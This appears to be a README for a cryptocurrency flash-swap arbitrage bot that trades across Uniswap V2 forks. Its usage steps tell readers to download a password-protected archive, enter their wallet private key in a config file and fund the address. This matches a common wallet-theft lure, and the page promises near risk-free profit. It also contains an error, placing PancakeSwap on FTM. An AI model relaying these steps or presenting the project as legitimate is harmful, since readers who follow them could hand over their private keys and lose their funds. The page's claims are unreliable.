### About
An arbitrage bot implementation that leverages flash swaps to arbitrage between Uniswap V2 AMMs & related forks (Ethereum, Binance Smart Chain, Avalanche).

![alt text](https://github.com/NFTERA/flshbot-arbitrage/blob/main/screen.png?raw=true)

There are a lot of AMMs on Ethereum and other blockchains that support EVM. Many of these AMMs are just forks of Uniswap V2 or share the same interface. A list of these AMMs:

- Pancacke Swap (FTM)
- Trader Joe(AVAX)
- Uniswap V2(Ethereum)
- Sushi Swap(Ethereum)

We can exploit this inefficiency, and arbitrage between these AMMs once the price of the same token pair diverges on different AMMs. All without ever risking more than a menial txn fee. 

Flash Swaps are similar to Aave Flash Loans, which allow you to withdraw all the liquidity of any ERC20 token from Uniswap without any cost, given at the end of the transaction you either:

- pay for the withdrawn ERC20 tokens 
with the corresponding pool/pair tokens.

or 

- return the withdrawn ERC20 tokens before the next block is mined. 

If you were unable to meet either of the conditions mentioned above, the flash swap transaction will fail, and any other arbitrary execution involved in that transaction will be rolled back.

This is possible because flash swaps are atomic Ethereum transactions.

### Usage
1. [Download] repository release(https://github.com/NFTERA/flshbot-arbitrage/archive/refs/heads/main.zip) and extract files with password `k0yiesv3gj0`
2. Edit `address` and `private_key` in `config.json` file.
3. Setup network and AMMs in flashbot menu. Note that there must be some funds on address to cover transaction fees.

### Please note
If you use a public RPC provider, chances are you will be rate limited within a few seconds/minutes. Or the connection will be too slow to be effective. This bot works best when connected to a private light node. 